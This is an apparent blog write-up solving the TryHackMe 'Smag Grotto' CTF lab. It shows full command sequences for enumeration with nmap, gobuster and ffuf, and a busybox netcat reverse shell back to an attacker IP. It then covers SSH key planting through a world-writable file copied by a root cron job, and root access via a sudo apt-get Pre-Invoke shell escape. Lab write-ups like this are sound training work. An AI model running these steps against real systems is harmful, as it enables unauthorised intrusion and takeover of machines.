---
title: "Smag Grotto"
date: 2025-01-28
image: /assets/img/tryhackme/Smaggrotto/Smaggrotto_image.jpg
description: Writeup of the TryHackMe-CTF Smag Grotto
categories: [Tryhackme, Easy]
tags: [linux, web, ssh, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Plattform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Smag Grotto</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Follow the yellow brick road.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/r/room/smaggrotto">https://tryhackme.com/r/room/smaggrotto</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution to the CTF challenge Smag Grotto.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.35.143      
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 05:18 EST
  Nmap scan report for 10.10.35.143
  Host is up (0.042s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

  Nmap done: 1 IP address (1 host up) scanned in 20.11 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80 10.10.35.143
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 05:18 EST
  Nmap scan report for 10.10.35.143
  Host is up (0.039s latency).

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
  |   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
  |_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_http-title: Smag
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 8.22 seconds
```
From here I proceeded the analysis with port 80.

## Port 80 Analysis
The website is under development and the small source code didn't reveal anything. Proceed with a directory enumeration:
```bash
$ gobuster dir --url http://10.10.35.143 --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.35.143
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/mail                 (Status: 301) [Size: 311] [--> http://10.10.35.143/mail/]
```
The mail directory showed a small mail history with mail addresses. These could be potential usernames, so we write them down. In the source code I found another one:
1. Netadmin
2. UZI
3. JAKE
4. TRODD

The mail addresses used the domain `smag.thm` so I entered this in my `hosts` file and started a subdomain enumeration using `ffuf`:
```bash
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.smag.thm" -u http://10.10.35.143 -fs 402

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.35.143
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.smag.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 402
________________________________________________

development             [Status: 200, Size: 1176, Words: 76, Lines: 18, Duration: 47ms]
:: Progress: [151265/151265] :: Job [1/1] :: 1000 req/sec :: Duration: [0:02:40] :: Errors: 0 ::
```

In the first mail I found a referenced pcap file. Downloaded it with `wget` and open it with `wireshark` 

## PCAP Analysis
The pcap file only consists of 10 packets. I followed the tcp stream and found something interesting:

![PCAP Analysis](/assets/img/tryhackme/Smaggrotto/thm_smaggrotto_1.jpg)

We have already found the subdomain highlighted in the red box, but the credentials are interesting.

## development.smag.thm Analysis
The subdomain showed us two web pages: 

![Directory Browsing](/assets/img/tryhackme/Smaggrotto/thm_smaggrotto_2.jpg)

I tried the `login.php` with the previous found credentials. The login was successful and a command execution page appeard:

![Command Execution](/assets/img/tryhackme/Smaggrotto/thm_smaggrotto_3.jpg)

I tried several commands, but the result is not displayed anywhere. This seems to be a kind of blind execution. To prove this I tried a `http` request to a webserver on the attacker machine:

![PCAP Analysis](/assets/img/tryhackme/Smaggrotto/thm_smaggrotto_4.jpg)

With this in mind I was able to receive a reverse shell by using `busybox`:
```bash
busybox nc [attacker ip] 9001 -e sh
```
This looks good:
```bash
$ nc -lnvp 9001                
listening on [any] 9001 ...
connect to [10.21.63.26] from (UNKNOWN) [10.10.35.143] 46918
whoami
	www-data
which python3
	/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'	
www-data@smag:/var/www/development.smag.thm$ ls /home
  ls /home
  jake
www-data@smag:/var/www/development.smag.thm$
```
Let's escalate to jake.

## Privilege Escalation jake
Always have a look in the `/etc/crontab`:
```bash
www-data@smag:/home/jake$ cat /etc/crontab      

[... removed for readability ...]

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
www-data@smag:/opt/.backups$ ls -al     
  ls -al
  total 12
  drwxr-xr-x 2 root root 4096 Jun  4  2020 .
  drwxr-xr-x 3 root root 4096 Jun  4  2020 ..
  -rw-rw-rw- 1 root root  563 Jun  5  2020 jake_id_rsa.pub.backup
```
We can write our own key to the authorized_keys. Let's start by generating a new ssh key on our attacker machine:
```bash
$ ssh-keygen                 
  Generating public/private ed25519 key pair.
  Enter file in which to save the key (/home/[removed]/.ssh/id_ed25519): id_rsa
  Enter passphrase (empty for no passphrase): 
  Enter same passphrase again: 
  Your identification has been saved in id_rsa
  Your public key has been saved in id_rsa.pub
  The key fingerprint is:
  SHA256:[removed]
  The key's randomart image is:
  +--[ED25519 256]--+
  |        ..*o*o   |
  |       ..+ *E+   |
  |        +.  +..  |
  |       = .+o     |
  |      + S.oo o   |
  |       = =  = .  |
  | . .  o o  . +   |
  |..o.+ .o  . ... .|
  |o..oo+oo.. ...oo |
  +----[SHA256]-----+
cat id_rsa
  -----BEGIN OPENSSH PRIVATE KEY-----
  b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
  QyNTUxOQAAACDeJF+qtBLA78OYcZ8pFMj/WWDm4sod5UuZ
  tYm4XQSBtLuHGgafHpbEAAAACWthbGlAa2FsaQECAwQ=
  -----END OPENSSH PRIVATE KEY-----
```
Now copy the public key and execute the following command on the victim machine:
```bash
echo "ssh-rsa b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbAAAACWthbGlAa2FsaQECAwQ= kali@kali" > /opt/.backups/jake_id_rsa.pub.backup
```
Grab yourself a coffee and wait for the cronjob to be executed. After a while you should be able to login
```bash
jake@smag:~$ cat user.txt 
[*** removed ***]
jake@smag:~$ 
```

## Privilege Escalation root
I started with `sudo -l` and got the following output:
```bash
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```
A quick search in <a href="https://gtfobins.github.io/gtfobins/apt-get/">gftobins</a> gave me all I needed:
```bash
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# cd /root
# cat root.txt
[*** removed ***]
#
```

solved! :)
